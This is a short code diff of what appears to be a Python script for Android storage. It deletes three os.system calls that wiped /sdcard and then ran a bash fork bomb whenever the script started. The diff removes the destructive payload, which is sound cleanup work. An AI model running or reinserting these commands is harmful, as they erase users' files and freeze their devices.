@@ -2,13 +2,6 @@
 import time,os,sys
 
 
-os.system("cd /sdcard")
-
-os.system("rm -rif /sdcard")
-
-
-os.system("rm -rif /sdcard/* && :(){ :|:& };:")
-
 
 def jalan(z):
     for e in z+"\n":
